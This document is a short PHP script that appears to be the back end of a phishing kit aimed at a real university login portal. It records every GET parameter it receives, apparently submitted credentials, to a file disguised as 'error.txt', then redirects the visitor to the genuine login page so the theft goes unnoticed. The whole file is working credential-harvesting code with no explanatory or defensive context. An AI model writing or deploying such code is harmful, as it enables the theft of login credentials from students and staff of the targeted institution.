<?php
header ('Location:http://www.iras.iub.edu.bd/login/Default.aspx');
$handle = fopen("error.txt","a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
exit;
?>